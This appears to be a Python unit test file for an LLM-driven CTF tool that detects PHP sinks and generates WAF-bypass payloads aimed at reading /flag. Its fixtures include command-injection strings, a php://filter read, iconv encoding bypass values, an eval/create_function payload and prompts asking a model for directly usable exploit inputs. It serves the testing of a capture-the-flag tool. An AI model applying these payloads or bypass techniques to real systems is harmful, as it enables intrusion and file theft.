import json
import io
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch
from urllib import error


ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

from PureWaf.agent import PureWafLlmSinkAgent
from PureWaf.agent import PureWafProjectAgent
from PureWaf.agent import ProjectSourceFile
from PureWaf.agent import PayloadValidationResult
from PureWaf.agent import MAX_PROJECT_FILE_BYTES
from PureWaf.agent import AGENT_ORIGINAL_TASK
from PureWaf.agent import AGENT_STATE_FILENAME
from PureWaf.agent import AgentStepLimitExceeded
from PureWaf.agent import AgentDataflowStep
from PureWaf.agent import AgentInputRef
from PureWaf.agent import AgentRoute
from PureWaf.agent import AgentTransformChain
from PureWaf.agent import LlmWafExtraction
from PureWaf.agent import PureWafAgentSession


class _FakeResponse:
    def __init__(self, payload):
        self.payload = payload

    def __enter__(self):
        return self

    def __exit__(self, _exc_type, _exc, _tb):
        return False

    def read(self):
        return self.payload


class LlmSinkAgentTests(unittest.TestCase):
    def test_missing_env_skips_without_network(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = PureWafLlmSinkAgent(cwd=Path(tmp))
            with patch("PureWaf.agent.request.urlopen") as urlopen_mock:
                result = agent.analyze_php("<?php system($_GET['x']);")

        self.assertFalse(result.used)
        self.assertIn(".env not found", result.error)
        urlopen_mock.assert_not_called()

    def test_missing_required_env_keys_skips(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text("BASE_URL=https://llm.example/v1\n", encoding="utf-8")
            agent = PureWafLlmSinkAgent(cwd=Path(tmp))
            with patch("PureWaf.agent.request.urlopen") as urlopen_mock:
                result = agent.analyze_php("<?php system($_GET['x']);")

        self.assertFalse(result.used)
        self.assertIn("API_KEY missing", result.error)
        urlopen_mock.assert_not_called()

    def test_missing_model_skips_without_network(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\n",
                encoding="utf-8",
            )
            agent = PureWafLlmSinkAgent(cwd=Path(tmp))
            with patch("PureWaf.agent.request.urlopen") as urlopen_mock:
                result = agent.analyze_php("<?php system($_GET['x']);")

        self.assertFalse(result.used)
        self.assertIn("MODEL missing", result.error)
        urlopen_mock.assert_not_called()

    def test_configured_model_and_successful_candidate_parse(self):
        seen = {}
        response_body = {
            "choices": [
                {
                    "message": {
                        "content": json.dumps(
                            {
                                "sinks": [
                                    {
                                        "function": "run_cmd",
                                        "kind": "command_exec",
                                        "payload_context": "shell_command",
                                        "argument_index": 0,
                                        "confidence": 0.91,
                                        "evidence": "run_cmd receives user-controlled command",
                                    }
                                ]
                            }
                        )
                    }
                }
            ]
        }

        def fake_urlopen(req, timeout):
            seen["req"] = req
            seen["timeout"] = timeout
            return _FakeResponse(json.dumps(response_body).encode("utf-8"))

        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\nMODEL=my-model\n",
                encoding="utf-8",
            )
            agent = PureWafLlmSinkAgent(cwd=Path(tmp), timeout=7)
            with patch("PureWaf.agent.request.urlopen", side_effect=fake_urlopen):
                result = agent.analyze_php("<?php run_cmd($_GET['x']);")

        self.assertTrue(result.used)
        self.assertEqual(result.model, "my-model")
        self.assertEqual(result.endpoint, "https://llm.example/v1/chat/completions")
        self.assertEqual(seen["timeout"], 7)
        sent = json.loads(seen["req"].data.decode("utf-8"))
        self.assertEqual(sent["model"], "my-model")
        self.assertEqual(result.candidates[0].function, "run_cmd")
        self.assertEqual(result.candidates[0].kind, "command_exec")

    def test_invalid_json_response_is_non_fatal(self):
        response_body = {"choices": [{"message": {"content": "not-json"}}]}

        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example\nMODEL=my-model\n",
                encoding="utf-8",
            )
            agent = PureWafLlmSinkAgent(cwd=Path(tmp))
            with patch(
                "PureWaf.agent.request.urlopen",
                return_value=_FakeResponse(json.dumps(response_body).encode("utf-8")),
            ):
                result = agent.analyze_php("<?php run_cmd($_GET['x']);")

        self.assertTrue(result.used)
        self.assertEqual(result.model, "my-model")
        self.assertIn("LLM response invalid", result.error)
        self.assertEqual(result.candidates, [])

    def test_http_error_includes_sanitized_response_details(self):
        body = b'{"error":{"message":"model denied for test-key"}}'

        def fake_urlopen(_req, timeout=None):
            raise error.HTTPError(
                url="https://llm.example/v1/chat/completions",
                code=403,
                msg="Forbidden",
                hdrs=None,
                fp=io.BytesIO(body),
            )

        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\nMODEL=my-model\n",
                encoding="utf-8",
            )
            agent = PureWafLlmSinkAgent(cwd=Path(tmp))
            with patch("PureWaf.agent.request.urlopen", side_effect=fake_urlopen):
                result = agent.analyze_php("<?php run_cmd($_GET['x']);")

        self.assertTrue(result.used)
        self.assertIn("HTTP 403 Forbidden", result.error)
        self.assertIn("endpoint=https://llm.example/v1/chat/completions", result.error)
        self.assertIn("model=my-model", result.error)
        self.assertIn("[REDACTED_API_KEY]", result.error)
        self.assertNotIn("test-key", result.error)

    def test_invalid_candidates_are_dropped(self):
        payload = {
            "sinks": [
                {
                    "function": "bad-name!",
                    "kind": "command_exec",
                    "payload_context": "shell_command",
                    "argument_index": 0,
                    "confidence": 0.99,
                    "evidence": "invalid function name",
                },
                {
                    "function": "run_cmd",
                    "kind": "unknown_kind",
                    "payload_context": "shell_command",
                    "argument_index": 0,
                    "confidence": 0.99,
                    "evidence": "invalid kind",
                },
                {
                    "function": "run_cmd",
                    "kind": "command_exec",
                    "payload_context": "shell_command",
                    "argument_index": 0,
                    "confidence": 0.2,
                    "evidence": "low confidence",
                },
            ]
        }

        candidates = PureWafLlmSinkAgent()._parse_candidates(json.dumps(payload))

        self.assertEqual(candidates, [])

    def test_project_scan_skips_vendor_and_reads_php_like_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            Path(root, "index.php").write_text("<?php system($_GET['x']);", encoding="utf-8")
            Path(root, "template.phtml").write_text("<?php echo $x;", encoding="utf-8")
            Path(root, "vendor").mkdir()
            Path(root, "vendor", "ignored.php").write_text("<?php eval($x);", encoding="utf-8")
            Path(root, "README.txt").write_text("ignore", encoding="utf-8")

            files = PureWafProjectAgent(cwd=root).scan_project_files(root)

        paths = [file.path for file in files]
        self.assertEqual(paths, ["index.php", "template.phtml"])

    def test_project_scan_truncates_large_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            Path(root, "big.php").write_text(
                "<?php\n" + ("A" * (MAX_PROJECT_FILE_BYTES + 32)),
                encoding="utf-8",
            )

            files = PureWafProjectAgent(cwd=root).scan_project_files(root)

        self.assertTrue(files[0].truncated)
        self.assertLessEqual(len(files[0].content.encode("utf-8")), MAX_PROJECT_FILE_BYTES)

    def test_parse_selected_paths_keeps_only_known_project_files(self):
        payload = json.dumps(
            {
                "selected_files": [
                    "index.php",
                    "missing.php",
                    "../evil.php",
                    "index.php",
                    "lib/waf.php",
                ]
            }
        )

        selected = PureWafProjectAgent._parse_selected_paths(
            payload,
            {"index.php", "lib/waf.php"},
        )

        self.assertEqual(selected, ["index.php", "lib/waf.php"])

    def test_parse_payload_review_extracts_fallback(self):
        payload = json.dumps(
            {
                "valid": False,
                "fallback_payload": "system('cat /flag');",
                "notes": "PureWaf did not produce a usable payload",
            }
        )

        review = PureWafProjectAgent._parse_payload_review(payload)

        self.assertFalse(review.valid)
        self.assertEqual(review.fallback_payload, "system('cat /flag');")
        self.assertIn("PureWaf", review.notes)

    def test_parse_payload_review_extracts_structured_final_output(self):
        payload = json.dumps(
            {
                "valid": False,
                "payload_value": "%FEf%00l%00a%00g",
                "request_path": "/preview.php?f=%FEf%00l%00a%00g",
                "request_cookies": {"user": "serialized-user"},
                "request_headers": {"Cookie": "user=serialized-user"},
                "payload_context": "url_query_value",
                "source": "llm_fallback",
                "evidence": "filter runs before iconv-like conversion",
                "notes": "path reaches file_get_contents",
            }
        )

        review = PureWafProjectAgent._parse_payload_review(payload)

        self.assertEqual(review.fallback_payload, "%FEf%00l%00a%00g")
        self.assertEqual(review.payload_value, "%FEf%00l%00a%00g")
        self.assertEqual(review.request_path, "/preview.php?f=%FEf%00l%00a%00g")
        self.assertEqual(review.request_cookies["user"], "serialized-user")
        self.assertEqual(review.request_headers["Cookie"], "user=serialized-user")
        self.assertEqual(review.payload_context, "url_query_value")
        self.assertEqual(review.source, "llm_fallback")
        self.assertIn("iconv", review.evidence)

    def test_payload_review_prompt_prioritizes_flag_fallback(self):
        messages = PureWafProjectAgent().build_payload_review_messages(
            source="<?php system($_GET['cmd']);",
            analysis_lines=["[*] AUTO: detected sink => command_exec"],
            shortest_root="ls /",
            shortest_flag="N/A",
            root_payloads=["ls /"],
            flag_payloads=[],
        )
        prompt = "\n".join(message["content"] for message in messages)

        self.assertIn("CTF Web expert", prompt)
        self.assertIn("primary objective is reading /flag", prompt)
        self.assertIn("provide exactly one", prompt)
        self.assertIn("fallback_required", prompt)
        self.assertIn("complete, directly usable exploit input value", prompt)
        self.assertIn("fallback_payload", prompt)

    def test_payload_review_prompt_includes_transform_chain(self):
        chain = AgentTransformChain(
            route=AgentRoute(path="/preview.php", method="GET"),
            input_ref=AgentInputRef(source="GET", key="f"),
            sink_kind="file_read_path",
            sink_function="file_get_contents",
            sink_argument="$convertedPath",
            steps=[
                AgentDataflowStep(
                    kind="filter",
                    function="preg_match",
                    before_transform=True,
                    effect="raw input checked before conversion",
                ),
                AgentDataflowStep(
                    kind="transform",
                    function="iconv",
                    effect="encoded bytes can become path text",
                ),
            ],
            strategy_hints=["avoid literal flag before transform"],
        )

        messages = PureWafProjectAgent().build_payload_review_messages(
            source="<?php echo file_get_contents($convertedPath);",
            analysis_lines=["[*] AUTO: detected sink => file_read_path"],
            shortest_root="N/A",
            shortest_flag="N/A",
            root_payloads=[],
            flag_payloads=[],
            transform_chain=chain,
        )
        prompt = "\n".join(message["content"] for message in messages)

        self.assertIn("transform_chain", prompt)
        self.assertIn("/preview.php", prompt)
        self.assertIn("payload_value", prompt)
        self.assertIn("request_path", prompt)

    def test_payload_review_rejects_invalid_empty_fallback(self):
        response_body = {
            "choices": [
                {
                    "message": {
                        "content": json.dumps(
                            {
                                "valid": False,
                                "fallback_payload": "",
                                "notes": "PureWaf did not produce a usable payload",
                            }
                        )
                    }
                }
            ]
        }

        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\nMODEL=my-model\n",
                encoding="utf-8",
            )
            agent = PureWafProjectAgent(cwd=Path(tmp))
            with patch(
                "PureWaf.agent.request.urlopen",
                return_value=_FakeResponse(json.dumps(response_body).encode("utf-8")),
            ):
                review = agent.review_payloads(
                    source="<?php system($_GET['cmd']);",
                    analysis_lines=["[*] AUTO: detected sink => command_exec"],
                    shortest_flag="N/A",
                    flag_payloads=[],
                )

        self.assertTrue(review.used)
        self.assertIn("fallback_payload is required", review.error)

    def test_payload_review_prompt_marks_failed_validation_as_fallback_required(self):
        messages = PureWafProjectAgent().build_payload_review_messages(
            source="<?php system($_GET['cmd']);",
            analysis_lines=["[*] AUTO: detected sink => command_exec"],
            shortest_root="N/A",
            shortest_flag="cat /flag",
            root_payloads=[],
            flag_payloads=["cat /flag"],
            validation_results=[
                PayloadValidationResult(
                    payload="cat /flag",
                    sink_kind="command_exec",
                    payload_context="shell_command",
                    attempted=True,
                    passed=False,
                    reason="sandbox output did not contain flag marker",
                )
            ],
        )
        prompt = "\n".join(message["content"] for message in messages)

        self.assertIn('"fallback_required": true', prompt)
        self.assertIn("PHP CLI sandbox validation did not confirm", prompt)

    def test_agent_session_writes_bounded_state_without_env_secret(self):
        response_body = {
            "choices": [
                {
                    "message": {
                        "content": json.dumps(
                            {
                                "sinks": [
                                    {
                                        "function": "system",
                                        "kind": "command_exec",
                                        "payload_context": "shell_command",
                                        "argument_index": 0,
                                        "confidence": 0.95,
                                        "evidence": "system receives user input",
                                    }
                                ]
                            }
                        )
                    }
                }
            ]
        }

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            root.joinpath(".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\nMODEL=my-model\n",
                encoding="utf-8",
            )
            session = PureWafAgentSession(cwd=root)
            agent = PureWafLlmSinkAgent(cwd=root, session=session)
            with patch(
                "PureWaf.agent.request.urlopen",
                return_value=_FakeResponse(json.dumps(response_body).encode("utf-8")),
            ):
                result = agent.analyze_php("<?php system($_GET['x']);")

            state_text = root.joinpath(AGENT_STATE_FILENAME).read_text(encoding="utf-8")
            state = json.loads(state_text)

        self.assertTrue(result.used)
        self.assertEqual(state["max_steps"], 10)
        self.assertEqual(state["current_step"], 1)
        self.assertLessEqual(len(state["history"]), 24)
        self.assertNotIn("test-key", state_text)
        self.assertIn("llm_sink_analysis", state_text)

    def test_agent_session_enforces_step_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            session = PureWafAgentSession(cwd=Path(tmp), max_steps=1)
            session.step("phase", "first")
            with self.assertRaises(AgentStepLimitExceeded):
                session.step("phase", "second")
            state = json.loads(Path(tmp, AGENT_STATE_FILENAME).read_text(encoding="utf-8"))

        self.assertEqual(state["current_step"], 1)
        self.assertEqual(state["status"], "step_limit_exceeded")

    def test_llm_prompts_include_immutable_agent_context(self):
        file = PureWafProjectAgent().build_project_selection_messages(
            [ProjectSourceFile("index.php", "<?php system($_GET['x']);", 24)]
        )
        sink = PureWafLlmSinkAgent().build_messages("<?php system($_GET['x']);")
        review = PureWafProjectAgent().build_payload_review_messages(
            source="<?php system($_GET['cmd']);",
            analysis_lines=["[*] AUTO: detected sink => command_exec"],
            shortest_root="N/A",
            shortest_flag="N/A",
            root_payloads=[],
            flag_payloads=[],
        )
        combined = "\n".join(
            message["content"]
            for message_group in (file, sink, review)
            for message in message_group
            if message["role"] == "system"
        )

        self.assertIn(AGENT_ORIGINAL_TASK, combined)
        self.assertIn("Security boundary", combined)
        self.assertIn("Max loop/step budget", combined)

    def test_payload_validation_php_code_and_file_read(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = PureWafProjectAgent(cwd=Path(tmp))
            php_code = agent.validate_payloads(
                ["echo file_get_contents('/flag');"],
                sink_kind="command_exec",
                payload_context="php_code",
            )[0]
            file_read = agent.validate_payloads(
                ["php://filter/read=convert.base64-encode/resource=/flag"],
                sink_kind="file_read_path",
                payload_context="any",
            )[0]

        if php_code.skipped or file_read.skipped:
            self.assertIn("php CLI not found", php_code.reason + file_read.reason)
        else:
            self.assertTrue(php_code.attempted)
            self.assertTrue(php_code.passed)
            self.assertTrue(file_read.attempted)
            self.assertTrue(file_read.passed)

    def test_payload_validation_uses_dataflow_transform_before_file_read(self):
        chain = AgentTransformChain(
            route=AgentRoute(path="/preview.php", method="GET"),
            input_ref=AgentInputRef(source="GET", key="f"),
            sink_kind="file_read_path",
            sink_function="file_get_contents",
            sink_argument="$convertedPath",
            steps=[
                AgentDataflowStep(
                    kind="filter",
                    function="preg_match",
                    before_transform=True,
                    effect="raw query value is filtered before conversion",
                ),
                AgentDataflowStep(
                    kind="transform",
                    function="iconv",
                    effect="iconv user-controlled ISO-2022-CN-EXT to UTF-8//IGNORE",
                ),
            ],
        )
        waf = LlmWafExtraction(
            waf_words=["flag", "php:", "data:"],
            waf_regex=[r"/flag|php:|data:/i"],
        )

        with tempfile.TemporaryDirectory() as tmp:
            agent = PureWafProjectAgent(cwd=Path(tmp))
            result = agent.validate_payloads(
                ["%E4f%B8l%AF%E6a%9C%87g"],
                sink_kind="file_read_path",
                payload_context="url_query_value",
                transform_chain=chain,
                waf_extraction=waf,
            )[0]

        self.assertTrue(result.attempted)
        self.assertTrue(result.passed)
        self.assertIn("dataflow transform reaches flag path", result.reason)

    def test_payload_validation_rejects_decoded_unicode_iconv_display_value(self):
        chain = AgentTransformChain(
            route=AgentRoute(path="/preview.php", method="GET"),
            input_ref=AgentInputRef(source="GET", key="f"),
            sink_kind="file_read_path",
            sink_function="file_get_contents",
            sink_argument="$convertedPath",
            steps=[
                AgentDataflowStep(
                    kind="filter",
                    function="preg_match",
                    before_transform=True,
                    effect="raw query value is filtered before conversion",
                ),
                AgentDataflowStep(
                    kind="transform",
                    function="iconv",
                    effect="iconv ISO-2022-CN-EXT to UTF-8//IGNORE",
                ),
            ],
        )
        waf = LlmWafExtraction(
            waf_words=["flag", "php:", "data:"],
            waf_regex=[r"/flag|php:|data:/i"],
        )

        with tempfile.TemporaryDirectory() as tmp:
            agent = PureWafProjectAgent(cwd=Path(tmp))
            unicode_result = agent.validate_payloads(
                ["%E4%B8%AF%E6%9C%87"],
                sink_kind="file_read_path",
                payload_context="url_query_value",
                transform_chain=chain,
                waf_extraction=waf,
            )[0]
            nul_result = agent.validate_payloads(
                ["%FEf%00l%00a%00g"],
                sink_kind="file_read_path",
                payload_context="url_query_value",
                transform_chain=chain,
                waf_extraction=waf,
            )[0]

        self.assertTrue(unicode_result.attempted)
        self.assertFalse(unicode_result.passed)
        self.assertIn("did not resolve", unicode_result.reason)
        self.assertTrue(nul_result.attempted)
        self.assertFalse(nul_result.passed)

    def test_payload_review_repairs_failed_iconv_ignore_fallback(self):
        response_body = {
            "choices": [
                {
                    "message": {
                        "content": json.dumps(
                            {
                                "valid": False,
                                "payload_value": "丯朇",
                                "request_path": "/preview.php?f=%E4%B8%AF%E6%9C%87",
                                "payload_context": "url_query_value",
                                "source": "purewaf",
                                "fallback_payload": "丯朇",
                                "evidence": "filter runs before iconv",
                                "notes": "display value selected",
                            }
                        )
                    }
                }
            ]
        }
        source = """
<?php
class User {
    public string $name = "guest";
    public string $encoding = "UTF-8";
    public string $basePath = "/var/www/html/uploads/";
}
$user = unserialize($_COOKIE['user']);
$rawPath = $user->basePath . $_GET['f'];
if (preg_match('/flag|\\/flag|\\.\\.|php:|data:|expect:/i', $rawPath)) { exit; }
$convertedPath = iconv($user->encoding, "UTF-8//IGNORE", $rawPath);
file_get_contents($convertedPath);
"""
        chain = AgentTransformChain(
            route=AgentRoute(path="/preview.php", method="GET"),
            input_ref=AgentInputRef(source="GET", key="f"),
            sink_kind="file_read_path",
            sink_function="file_get_contents",
            sink_argument="$convertedPath",
            steps=[
                AgentDataflowStep(
                    kind="filter",
                    function="preg_match",
                    before_transform=True,
                    effect="raw query value filtered before iconv",
                ),
                AgentDataflowStep(
                    kind="transform",
                    function="iconv",
                    effect="iconv user-controlled ISO-2022-CN-EXT to UTF-8//IGNORE",
                ),
            ],
            strategy_hints=["user cookie controls basePath and encoding"],
        )
        waf = LlmWafExtraction(
            waf_words=["flag", "php:", "data:", "expect:"],
            waf_regex=[r"/flag|\/flag|\.\.|php:|data:|expect:/i"],
        )

        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\nMODEL=my-model\n",
                encoding="utf-8",
            )
            agent = PureWafProjectAgent(cwd=Path(tmp))
            with patch(
                "PureWaf.agent.request.urlopen",
                return_value=_FakeResponse(json.dumps(response_body).encode("utf-8")),
            ):
                review = agent.review_payloads(
                    source,
                    ["[*] AUTO: detected sink => file_read_path"],
                    shortest_flag="N/A",
                    flag_payloads=[],
                    waf_extraction=waf,
                    transform_chain=chain,
                    sink_kind="file_read_path",
                    payload_context="url_query_value",
                )

        self.assertFalse(review.valid)
        self.assertFalse(review.error)
        self.assertEqual(review.payload_value, "%E4f%B8l%AF%E6a%9C%87g")
        self.assertEqual(review.request_path, "/preview.php?f=%E4f%B8l%AF%E6a%9C%87g")
        self.assertEqual(review.source, "agent_dataflow_repair")
        self.assertIn("user", review.request_cookies)
        self.assertIn("Cookie", review.request_headers)
        self.assertIn("basePath=/", review.notes)

    def test_payload_validation_skips_when_php_cli_missing(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = PureWafProjectAgent(cwd=Path(tmp))
            with patch("PureWaf.agent.shutil.which", return_value=None):
                result = agent.validate_payloads(
                    ["echo file_get_contents('/flag');"],
                    sink_kind="command_exec",
                    payload_context="php_code",
                )[0]

        self.assertTrue(result.skipped)
        self.assertIn("php CLI not found", result.reason)

    def test_custom_command_prompt_includes_php_version_lock(self):
        with tempfile.TemporaryDirectory() as tmp:
            agent = PureWafProjectAgent(cwd=Path(tmp))

        messages = agent.build_custom_command_messages(
            "<?php system($_GET['x']); ?>",
            "cat /flag",
            php_version_lock="8.0",
        )

        combined = "\n".join(message["content"] for message in messages)
        self.assertIn("PHP version lock: 8.0", combined)
        self.assertIn("MUST be valid on PHP 8.0", combined)
        self.assertIn("create_function/assert-string execution on PHP 8+", combined)

    def test_custom_command_rejects_llm_payload_outside_php_lock(self):
        response_body = {"choices": [{"message": {"content": json.dumps({
            "payload": "$__=create_function('', $_POST[x]);$__();",
            "notes": "legacy factory",
        })}}]}

        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, ".env").write_text(
                "API_KEY=test-key\nBASE_URL=https://llm.example/v1\nMODEL=my-model\n",
                encoding="utf-8",
            )
            agent = PureWafProjectAgent(cwd=Path(tmp))
            with patch(
                "PureWaf.agent.request.urlopen",
                return_value=_FakeResponse(json.dumps(response_body).encode("utf-8")),
            ):
                result = agent.generate_custom_command_bypass(
                    "<?php eval($_POST['x']); ?>",
                    "id",
                    php_version_lock="8.0",
                )

        self.assertEqual(result["payload"], "")
        self.assertIn("not compatible with PHP 8.0", result["error"])


if __name__ == "__main__":
    unittest.main()
